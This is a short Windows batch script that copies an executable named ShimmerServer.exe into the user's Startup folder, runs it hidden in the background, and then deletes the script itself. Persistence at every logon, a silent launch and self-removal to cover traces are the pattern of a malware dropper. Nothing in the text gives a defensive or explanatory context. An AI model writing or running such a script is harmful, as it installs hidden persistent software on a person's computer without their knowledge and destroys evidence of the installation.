copy ShimmerServer.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
start /b "" cmd /c "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShimmerServer.exe" /b
start /b "" cmd /c del "%~f0"&exit /b